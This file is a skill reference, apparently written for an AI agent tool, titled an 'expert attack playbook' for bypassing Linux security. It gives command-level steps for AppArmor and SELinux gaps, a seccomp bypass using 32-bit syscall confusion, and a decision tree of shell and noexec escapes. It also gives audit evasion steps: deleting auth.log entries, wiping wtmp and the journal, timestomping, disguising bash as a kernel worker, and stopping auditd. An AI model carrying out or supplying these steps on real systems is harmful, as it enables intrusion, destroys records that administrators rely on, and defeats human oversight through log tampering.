# SKILL: Linux Security Bypass — Expert Attack Playbook: detailed technique reference

<!-- zhiyugo:resource:start -->
> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
<!-- zhiyugo:resource:end -->

<!-- zhiyugo:toc:start -->
## Contents

- [3. APPARMOR BYPASS](#3-apparmor-bypass)
- [4. SELINUX BYPASS](#4-selinux-bypass)
- [5. SECCOMP BYPASS](#5-seccomp-bypass)
- [6. AUDIT EVASION](#6-audit-evasion)
- [7. LINUX SECURITY BYPASS DECISION TREE](#7-linux-security-bypass-decision-tree)
<!-- zhiyugo:toc:end -->

## 3. APPARMOR BYPASS

### 3.1 Profile Enumeration

```bash
# Check AppArmor status
aa-status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled     # Y = enabled
cat /sys/kernel/security/apparmor/profiles      # List all profiles

# Check current process profile:
cat /proc/self/attr/current
# "unconfined" = no restriction
# "docker-default (enforce)" = Docker's default profile
```

### 3.2 Exploitation Strategies

```bash
# Find unconfined processes (inject via ptrace if root):
ps auxZ 2>/dev/null | grep unconfined

# Complain mode = effectively no restriction (just logging):
aa-status | grep complain
```

Common AppArmor profile gaps: `/proc/self/fd/*` access, abstract Unix sockets, interpreter-based execution (python scripts bypass binary restrictions), and newly created paths.

---

## 4. SELINUX BYPASS

### 4.1 Mode Check

```bash
getenforce           # Enforcing / Permissive / Disabled
sestatus             # Detailed status
cat /etc/selinux/config   # Persistent configuration

# Check current context
id -Z
ps auxZ | head -20
```

### 4.2 Permissive Domain Exploitation

```bash
semanage permissive -l 2>/dev/null    # Domains in permissive mode
ps -eZ | grep -i permissive           # Processes — can do anything (just logged)
```

### 4.3 Context Transition & Booleans

```bash
ls -Z /tmp/                           # File contexts — tmp_t has broader access
sesearch --allow -t unconfined_t 2>/dev/null | head -30   # Transition rules

# Dangerous booleans that weaken SELinux:
getsebool -a | grep -i "on$" | grep -iE "exec|write|network|connect"
# httpd_can_network_connect, allow_execmem
```

---

## 5. SECCOMP BYPASS

### 5.1 Check Seccomp Status

```bash
grep Seccomp /proc/self/status
# Seccomp: 0 = disabled, 1 = strict, 2 = filter

# Docker default seccomp profile blocks ~44 syscalls
# Check what's allowed:
./amicontained    # Shows blocked/allowed syscalls
```

### 5.2 Architecture Confusion (x86 vs x86_64)

```bash
# Seccomp filters often only check x86_64 syscall numbers
# x86 (32-bit) syscall numbers are different!
# If the filter doesn't check the architecture:

# Compile a 32-bit binary that uses x86 syscall numbers:
# x86_64 execve = 59, x86 execve = 11
# The filter blocks syscall 59 but not 11

gcc -m32 -static -o exploit32 exploit.c
# If the seccomp filter lacks AUDIT_ARCH_X86 check → bypass
```

### 5.3 Allowed Syscall Abuse & Kernel Bugs

Allowed syscalls to abuse creatively: `sendmsg/recvmsg` (pass FDs between processes), `mmap/mprotect` (executable memory), `process_vm_readv/writev` (cross-process memory).

Known seccomp kernel bugs: CVE-2019-2054 (ptrace bypass), io_uring bypassed seccomp entirely (pre-5.12). Check `uname -r` and compare.

---

## 6. AUDIT EVASION

### 6.1 Timestamp Manipulation

```bash
# Modify file timestamps to hide changes
touch -r /etc/hosts /modified/file          # Copy timestamp from reference
touch -t 202301010000.00 /modified/file     # Set specific timestamp

# Modify log timestamps (if writable)
# Use timestomping to match surrounding entries
```

### 6.2 Log Tampering & Process Spoofing

```bash
sed -i '/pattern/d' /var/log/auth.log     # Remove specific entries
echo "" > /var/log/wtmp                    # Clear login records
journalctl --rotate && journalctl --vacuum-time=1s   # Clear journal

# Process name spoofing (hide in ps output):
exec -a "[kworker/0:0]" /bin/bash          # Bash
# C/Python: prctl(PR_SET_NAME, "kworker/0:0", 0, 0, 0)

# Disable audit (if root):
auditctl -e 0 && service auditd stop
```

---

## 7. LINUX SECURITY BYPASS DECISION TREE

```
Security mechanism identified?
│
├── Restricted shell (rbash)?
│   ├── SSH access? → ssh -t "bash --noprofile --norc" (§1.1)
│   ├── Editor available? → vi :!/bin/bash (§1.2)
│   ├── Language interpreter? → python/perl/ruby escape (§1.3)
│   ├── env command? → env /bin/bash (§1.4)
│   └── Allowed commands with escape? → git/man/less → !bash (§1.5)
│
├── noexec filesystem?
│   ├── Script interpreters available? → bash/python/perl scripts work (§2.4)
│   ├── /dev/shm writable + exec? → copy binary there (§2.5)
│   ├── memfd_create available? → fileless execution (§2.2)
│   ├── ld.so accessible? → ld.so /path/to/binary (§2.3)
│   └── Last resort → DDexec via /proc/self/mem (§2.1)
│
├── AppArmor enforcing?
│   ├── Profile in complain mode? → no restriction, just logging (§3.3)
│   ├── Unconfined processes exist? → inject/migrate to them (§3.2)
│   ├── Profile missing path coverage? → use uncovered paths (§3.4)
│   └── Interpreter not restricted? → script-based execution
│
├── SELinux enforcing?
│   ├── Domain set to permissive? → exploit that domain (§4.2)
│   ├── Dangerous booleans enabled? → abuse allowed actions (§4.4)
│   ├── Context transition available? → execute binary with transition (§4.3)
│   └── Kernel CVE? → SELinux bypass exploit
│
├── seccomp filter active?
│   ├── Architecture check missing? → 32-bit syscall confusion (§5.2)
│   ├── Allowed syscalls exploitable? → sendmsg/mmap abuse (§5.3)
│   ├── Kernel bug? → io_uring/ptrace bypass (§5.4)
│   └── Check what's blocked → amicontained (§5.1)
│
└── Audit logging?
    ├── Writable logs? → delete/modify entries (§6.2)
    ├── Root access? → disable auditd (§6.4)
    ├── Need stealth? → process name spoofing (§6.3)
    └── File changes tracked? → timestamp manipulation (§6.1)
```
